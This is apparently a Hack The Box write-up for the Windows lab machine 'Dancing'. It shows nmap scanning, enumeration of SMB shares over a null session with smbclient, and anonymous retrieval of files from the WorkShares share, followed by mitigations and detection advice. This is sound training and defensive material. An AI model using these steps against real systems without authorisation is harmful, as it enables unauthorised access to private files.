---
machine: Dancing
os: Windows
difficulty: Very Easy
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/395
category: Starting Point
state: Available
pwned: 2026-11-01
tags: [windows, smb, null-session]
---

# Dancing — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **Available** Starting Point machine (Tier 0). No flags in this document.

## TL;DR

SMB is open with null sessions allowed. The shares are listed, `WorkShares` is entered without credentials, and a user's notes and the flag are inside. No exploit: pure misconfiguration.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 135,139,445 <TARGET_IP>
```

| Port | Service |
|---|---|
| 135/tcp | MSRPC |
| 139/tcp | NetBIOS |
| 445/tcp | SMB (Windows) |

## Enumeration

```bash
smbclient -L //<TARGET_IP> -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

`-N` means no user and no password. The server accepts the null session and lists the shares.

## Foothold

```bash
smbclient //<TARGET_IP>/WorkShares -N
```

```
smb: \> ls
  Amy.J      D        0  ...
  James.P    D        0  ...

smb: \> cd James.P
smb: \James.P\> ls
  flag.txt
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

```bash
cat flag.txt      # <FLAG>
```

`Amy.J` holds a `worknotes.txt` with user notes; useful context, not an escalation path.

## Evidence

- `smbclient -L` output with the null session accepted.
- Listing of `WorkShares` and a cropped `flag.txt`.

## Lessons learned

- Null sessions (`IPC$`/guest) remain one of the first things to test on SMB.
- A share readable by `Everyone` is a full information leak with no exploit needed.
- User notes (`worknotes.txt`) are useful context: names, paths and internal services.

## Mitigations and detection

- Disable the `Guest` account and reject null sessions (`RestrictNullSessAccess=1`, `RestrictAnonymous=1`).
- Review each share's ACL: only the groups that need it.
- Sign SMB (`RequireSecuritySignature`) and disable SMBv1.
- Detection: `ANONYMOUS LOGON` in Event ID 4624 and 5140 share access from unauthenticated accounts.

## References

- <https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview>
- <https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html>
